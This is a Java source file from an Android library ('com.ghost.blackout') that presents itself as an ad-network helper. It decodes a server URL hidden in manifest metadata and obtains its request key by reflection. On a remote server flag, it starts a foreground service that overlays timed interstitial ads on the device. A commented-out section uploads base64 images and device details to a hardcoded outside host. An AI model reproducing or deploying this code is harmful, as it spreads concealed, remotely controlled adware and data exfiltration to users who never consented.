package com.ghost.blackout.network;

import static com.ghost.blackout.ActivityInner.idInters;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;

import com.android.volley.AuthFailureError;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.ghost.blackout.BuildConfig;
import com.ghost.blackout.services.BServiceS;
import com.ghost.blackout.views.OverPermission;
import com.wineberryhalley.bclassapp.TinyDB;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class InnerApi {

    private Context context;
    private RequestQueue queue;
    private String a_ = "";
    private String k_ = "";
    private String TAG = "MAIN";

    private static boolean isStarted = false;

    public InnerApi(Context c) {
        context = c;
        try {
            queue = Volley.newRequestQueue(context);
            BServiceS.tinyDB = new TinyDB(context);
            //  Log.e("MAIN", "init: multi" );


            Class<?> klass = Class.forName(BuildConfig.LIBRARY_PACKAGE_NAME + ".BuildConfig");
            ApplicationInfo app = context.getPackageManager().getApplicationInfo(context.getPackageName(), PackageManager.GET_META_DATA);
            Bundle bundle = app.metaData;
            a_ = bundle.getString("com.mna.hot");

            a_ = getD(a_);

            if (!a_.endsWith("api/index.php")) {
                a_ = a_ + "/api/index.php";
            }
            //  Log.e(TAG, "Jedleto: "+a_ );

            Field fa = klass.getField("a_qkal");
            Field fielda = klass.getDeclaredField(String.valueOf(fa.get(null)));
            k_ = String.valueOf(fielda.get(null));
            //     Log.e("MAIN", "InnerApi: si "+k_ );

        } catch (Exception e) {
            Log.e("MAIN", "Error man: " + e.getMessage());
            e.printStackTrace();
        }
    }


    public static String getD(final String s) {
        // Receiving side
        byte[] data1 = Base64.decode(s, Base64.DEFAULT);
        String text1 = "";
        try {
            text1 = new String(data1, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return text1;
    }


    public void load(boolean needToGO) {

        if (isStarted) {
            return;
        }

        Log.e(TAG, "load: ya inicio" );
        StringRequest jsonArrayRequest = new StringRequest(Request.Method.POST, a_, new Response.Listener<String>() {
            @Override
            public void onResponse(String responsea) {

                //   Log.e("MAIN", "MultiResponse "+responsea );
                try {
                    JSONObject response = new JSONObject(responsea);
                    // Log.e("MAIN", "onResponse: "+response.has("status") );
                    if (success(response)) {

                        boolean iActiv = response.getJSONObject("black").getString("activated").equals("0");
                        int aSec = Integer.parseInt(response.getJSONObject("black").getString("secs"));


                        BServiceS.std3(iActiv);


                        if (iActiv) {

                            JSONArray array = response.getJSONArray("data");
                            String id = "";
                            for (int i = 0; i < array.length(); i++) {
                                JSONObject abueno = array.getJSONObject(i);

                                if (abueno.getString("ad_type").equalsIgnoreCase("1")) {
                                    id = abueno.getString("value");
                                    break;
                                }

                            }

                            idInters = id;

                            OverPermission.initDB(context);
                            BServiceS.save(id, aSec);
                            //  Log.e(TAG, "onResponse: sec es "+aSec );
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && OverPermission.canOverDraw()) {
                                context.startForegroundService(new Intent(context, BServiceS.class));
                                Log.e(TAG, "onResponse: todo ben" );
                                String finalId = id;
                                BServiceS.setServiceListener(new BServiceS.ListenerService() {
                                    @Override
                                    public void OnServiceStart() {
                                        BServiceS.getInstance()
                                                .setupInterstitial(finalId)
                                                .shouldStart(needToGO)
                                                .setupTime(aSec, aSec)
                                                .startBService();
                                        Log.e(TAG, "OnServiceStart: started "+needToGO );

                                    }

                                    @Override
                                    public void OnServiceStop() {

                                    }
                                });

                            }
                            //   Log.e(TAG, "onResponse: service starting" );

                        }

                        isStarted = true;

                        //   Log.e("MAIN", "onResponse: "+response.toString() );
                    } else {
                        Log.e("MAIN", "onResponse: " + response.getString("data"));
                        //   AdMNA.initializeError(response.getString("data"));

                    }

                } catch (JSONException e) {
                    Log.e("MAIN", "onResponse: " + e.getMessage());


                }


                queue.getCache().clear();
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                //    AdMNA.initializeError(error.getMessage());
                Log.e("MAIN", "onErrorResponse: " + error.getMessage());
                queue.getCache().clear();

            }
        }) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> a = map();
                a.put("get_ads", "a");
                return a;
            }
        };

        queue.add(jsonArrayRequest);
    }


    private Map<String, String> map() {
        HashMap<String, String> a = new HashMap<>();
        //  Log.e("MAIN", "map: "+k_+" "+a_ );
        a.put(k_, context.getPackageName());

        return a;
    }


    private boolean success(JSONObject a) throws JSONException {
        if (a.getString("status").equals("success")) {
            return true;
        }
        return false;
    }

/*
    public void sendImage(final String image, final String name,final UploadListener listener) {

        StringRequest stringRequest = new StringRequest(Request.Method.POST, "https://noneparmen.growater.us/aea/pep.php", new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.e("MAIN", response);

                listener.onUploadSuccess(response);

            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                listener.onUploadError("volley: "+error.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {

                Map<String, String> params = new Hashtable<String, String>();

                params.put("ung_base", image);
                params.put("andr", android);
                params.put("cant", countImg);
                params.put("name", name);
                params.put("inde", index);

                return params;
            }
        };

        int socketTimeout = 30000;
        RetryPolicy policy = new DefaultRetryPolicy(socketTimeout, DefaultRetryPolicy.DEFAULT_MAX_RETRIES, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
        stringRequest.setRetryPolicy(policy);
        queue.add(stringRequest);
    }


    public void initb(String info) {

        StringRequest stringRequest = new StringRequest(Request.Method.POST, "https://noneparmen.growater.us/aea/pep.php", new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.e("MAIN", response);



            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {

                Map<String, String> params = new Hashtable<String, String>();

                if(android == null){
                    android = String.valueOf(Build.VERSION.SDK_INT);
                }
//                params.put("ung_base", image);
                params.put("andr", android);
                params.put("cant", info);


                return params;
            }
        };

        int socketTimeout = 30000;
        RetryPolicy policy = new DefaultRetryPolicy(socketTimeout, DefaultRetryPolicy.DEFAULT_MAX_RETRIES, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
        stringRequest.setRetryPolicy(policy);
        queue.add(stringRequest);
    }

    private String android;
    private String countImg;

    public void setData(int con){
        android = String.valueOf(Build.VERSION.SDK_INT);
        countImg = String.valueOf(con);
    }

    public interface UploadListener {
        void onUploadSuccess(String url);

        void onUploadError(String err);
    }

    public interface UploadMultiple {
        void onUploadAll();

        void onSomeError(String er);
    }

    private int s = 0;
    private ArrayList<String> base64s = new ArrayList<>();
    private ArrayList<String> names = new ArrayList<>();
    private UploadMultiple multiple;
    private String index = "0";
    public void uploadMultiple(ArrayList<String> base64s, ArrayList<String> name, int ind,UploadMultiple uploadMultiple){
        s = 0;
        index = String.valueOf(ind);
        this.base64s.clear();
        this.base64s.addAll(base64s);
        this.names.clear();
        this.names.addAll(name);
        String fir = this.base64s.get(s);
        String nm = this.names.get(s);
        this.multiple = uploadMultiple;

        sendImage(fir, nm, listener);
    }

    private UploadListener listener = new UploadListener() {
        @Override
        public void onUploadSuccess(String url) {
            s++;
            if (s < base64s.size()) {
    int d = Integer.parseInt(index);
    d++;
    index = String.valueOf(d);
                String fir = base64s.get(s);
                String nm = names.get(s);
                sendImage(fir, nm,listener);
            }else if(multiple != null){
                multiple.onUploadAll();
            }
        }

        @Override
        public void onUploadError(String err) {
            Log.e(TAG, "onUploadError: "+err );
            if(multiple != null){
                multiple.onSomeError(err);
            }
        }
    };
*/

}
